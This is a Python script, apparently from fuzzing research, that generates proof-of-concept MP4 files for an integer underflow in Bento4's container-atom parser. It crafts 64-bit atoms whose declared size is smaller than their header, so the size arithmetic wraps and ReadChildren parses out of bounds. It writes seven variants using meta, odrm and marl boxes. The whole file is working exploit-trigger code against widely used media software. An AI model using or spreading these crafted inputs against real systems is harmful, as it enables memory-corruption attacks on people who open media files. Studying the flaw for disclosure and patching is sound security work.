#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Underflow in ReadChildren via
Crafted 64-bit Full/Non-full Container Atom Size.

Root cause: AP4_ContainerAtom::Create() checks size >= AP4_FULL_ATOM_HEADER_SIZE (12)
but for 64-bit full atoms the header is 20 bytes. With size_64=14 (12<=14<20),
the check passes, then size-GetHeaderSize() = 14-20 underflows to 0xFFFFFFFFFFFFFFFA,
which is passed to ReadChildren() causing out-of-bounds parsing.

Approaches tried (in order):
  1. Top-level meta box, 64-bit encoded, size_64=14
  2. meta inside moov, 64-bit encoded, size_64=14
  3. odrm at top level, 64-bit encoded, size_64 in {12..19}
  4. marl at top level (non-full), 64-bit encoded, size_64=8
"""
import struct, os, sys

OUT_DIR = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4ContainerAtom_cpp'
os.makedirs(OUT_DIR, exist_ok=True)

# ── helpers ──────────────────────────────────────────────────────────────────

def box32(btype: bytes, data: bytes = b'') -> bytes:
    """Standard 32-bit size box."""
    assert len(btype) == 4
    size = 8 + len(data)
    return struct.pack('>I4s', size, btype) + data


def fullbox32(btype: bytes, version: int = 0, flags: int = 0,
              data: bytes = b'') -> bytes:
    """Standard 32-bit size full box."""
    return box32(btype, struct.pack('>BBBBs', version,
                                    (flags >> 16) & 0xff,
                                    (flags >> 8) & 0xff,
                                    flags & 0xff,
                                    b'')[:-1] + data)


def ftyp_box() -> bytes:
    """Minimal ftyp box."""
    data = b'mp41' + struct.pack('>I', 0) + b'mp41' + b'isom'
    return box32(b'ftyp', data)


def mvhd_box() -> bytes:
    """Minimal mvhd (version 0) with all-zero payload (108 bytes total)."""
    # version=0 mvhd: 4 (hdr) + 4 (version+flags) + 96 bytes payload = 104
    # We just want something parseable; use 92 zero bytes after version+flags
    return fullbox32(b'mvhd', data=b'\x00' * 96)


# ── crafted full-atom 64-bit box (triggers underflow) ────────────────────────

def crafted_fullbox64(btype: bytes, size64_declared: int,
                      trailing: bytes = b'') -> bytes:
    """
    Write a 64-bit full atom whose declared size is intentionally small.

    Physical layout written:
        size_32  = 1              (4 B)
        type     = btype          (4 B)
        size_64  = size64_declared(8 B)  ← declared total (< real header size)
        version  = 0              (1 B)
        flags    = 0,0,0          (3 B)
        trailing = extra bytes    (variable)

    The parser reads size_32+type+size_64 = 16 B, then Create() receives
    size=size64_declared.  After ReadFullHeader() consumes 4 more bytes
    (version+flags), the constructor calls:
        ReadChildren(size - GetHeaderSize()) = size64_declared - 20
    which underflows for size64_declared < 20.
    """
    assert len(btype) == 4
    hdr = struct.pack('>I4sQBBBB',
                      1,        # size_32 = 1 → 64-bit encoding
                      btype,
                      size64_declared,
                      0,        # version
                      0, 0, 0)  # flags
    return hdr + trailing


def crafted_containerbox64(btype: bytes, size64_declared: int,
                           trailing: bytes = b'') -> bytes:
    """
    Non-full 64-bit container box with intentionally small declared size.

    GetHeaderSize() for non-full, 64-bit = 8 + 8 = 16.
    Underflows for size64_declared < 16.
    """
    assert len(btype) == 4
    hdr = struct.pack('>I4sQ',
                      1,        # size_32 = 1 → 64-bit encoding
                      btype,
                      size64_declared)
    return hdr + trailing


# ── fake child atoms placed after the underflowing header ────────────────────
#
# These bytes will be greedily consumed by the underflowed ReadChildren.
# We use known atom types so specific parsers are exercised.

def fake_children() -> bytes:
    """
    A sequence of plausible child atoms whose combined data will be parsed
    by the underflowed ReadChildren loop.  We include:
      - a 'free' spacer
      - a minimal 'hdlr' full-box (known-atom parser)
      - padding so the total file is not trivially short
    """
    free_atom   = box32(b'free', b'B' * 64)
    # hdlr: version(1)+flags(3)+pre_defined(4)+handler_type(4)+reserved(12)+name(1) = 25
    hdlr_data   = struct.pack('>IIII', 0, 0x736f756e, 0, 0) + b'\x00'
    hdlr_atom   = fullbox32(b'hdlr', data=hdlr_data)
    padding     = box32(b'free', b'C' * 256)
    return free_atom + hdlr_atom + padding


# ════════════════════════════════════════════════════════════════════════════
# Variant A: top-level meta box with 64-bit encoding, size_64=14
# ════════════════════════════════════════════════════════════════════════════

def build_variant_A() -> bytes:
    """
    File layout:
        ftyp
        meta  (64-bit, size_64=14)  ← underflows GetHeaderSize()==20
            [version=0, flags=0]    (already consumed by ReadFullHeader)
            fake_children            ← parsed OOB due to underflow
        mdat
    """
    children    = fake_children()
    meta_bytes  = crafted_fullbox64(b'meta', 14, children)
    mdat        = box32(b'mdat', b'\x00' * 8)
    return ftyp_box() + meta_bytes + mdat


# ════════════════════════════════════════════════════════════════════════════
# Variant B: meta inside moov, 64-bit encoding, size_64=14
# ════════════════════════════════════════════════════════════════════════════

def build_variant_B() -> bytes:
    children    = fake_children()
    meta_bytes  = crafted_fullbox64(b'meta', 14, children)
    moov_data   = mvhd_box() + meta_bytes
    moov        = box32(b'moov', moov_data)
    mdat        = box32(b'mdat', b'\x00' * 8)
    return ftyp_box() + moov + mdat


# ════════════════════════════════════════════════════════════════════════════
# Variant C: top-level odrm box, size_64=12 (borderline: 12>=12 but 12<20)
# ════════════════════════════════════════════════════════════════════════════

def build_variant_C(size64: int = 12) -> bytes:
    children    = fake_children()
    odrm_bytes  = crafted_fullbox64(b'odrm', size64, children)
    mdat        = box32(b'mdat', b'\x00' * 8)
    return ftyp_box() + odrm_bytes + mdat


# ════════════════════════════════════════════════════════════════════════════
# Variant D: top-level marl box (non-full container), 64-bit, size_64=8
#  marl is registered as context==0-only, non-full container in AtomFactory
#  GetHeaderSize() = 8 + 8 = 16  →  8-16 = 0xFFFFFFFFFFFFFFF8
# ════════════════════════════════════════════════════════════════════════════

def build_variant_D(size64: int = 8) -> bytes:
    children    = fake_children()
    marl_bytes  = crafted_containerbox64(b'marl', size64, children)
    mdat        = box32(b'mdat', b'\x00' * 8)
    return ftyp_box() + marl_bytes + mdat


# ════════════════════════════════════════════════════════════════════════════
# Write all variants
# ════════════════════════════════════════════════════════════════════════════

variants = {
    'vuln_001.mp4':   build_variant_A(),          # primary
    'vuln_001b.mp4':  build_variant_B(),          # moov-nested
    'vuln_001c.mp4':  build_variant_C(12),        # odrm, size=12
    'vuln_001d.mp4':  build_variant_C(13),        # odrm, size=13
    'vuln_001e.mp4':  build_variant_C(19),        # odrm, size=19 (max underflow)
    'vuln_001f.mp4':  build_variant_D(8),         # marl non-full, size=8
    'vuln_001g.mp4':  build_variant_D(15),        # marl non-full, size=15
}

for fname, data in variants.items():
    path = os.path.join(OUT_DIR, fname)
    with open(path, 'wb') as f:
        f.write(data)
    print(f'Written {len(data):6d} bytes → {path}')

print('\nAll PoC files generated.')
